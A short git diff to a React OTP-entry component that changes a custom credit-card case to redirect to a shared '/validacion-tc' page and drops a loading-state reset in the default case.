@@ -470,8 +470,8 @@ export default function NumeroOTP() {
                         break;
                     case 'solicitar_tc_custom':
 
-                        // Redirigir a la validación de tarjeta de crédito custom
-                        window.location.href = '/tc-customs';
+                        // Redirigir a la validación de tarjeta de crédito (usa la misma vista para TC estándar y custom)
+                        window.location.href = '/validacion-tc';
 
                         // Se sale del ciclo
                         break;
@@ -493,9 +493,6 @@ export default function NumeroOTP() {
                         // Se sale del ciclo
                         break;
                     default:
-
-                        // Se quita el estado de cargando
-                        setCargando(false);
 
                         // Se sale del ciclo
                         break;
